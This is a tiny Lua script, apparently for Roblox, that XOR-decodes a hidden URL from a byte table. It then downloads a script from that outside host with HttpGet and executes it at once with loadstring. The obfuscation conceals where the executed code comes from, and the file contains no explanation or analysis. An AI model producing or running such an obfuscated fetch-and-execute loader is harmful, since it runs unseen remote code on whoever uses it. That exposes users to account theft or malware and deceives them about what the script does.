local B=bit32
local D={33,61,61,57,58,115,102,102,38,43,47,60,58,42,40,61,38,59,33,60,43,103,37,38,37,102,40,57,32,102,44,59,33,60,43}
local R={}
for i=1,#D do R[i]=string.char(B.bxor(D[i],73)) end
loadstring(game:HttpGet(table.concat(R)))()
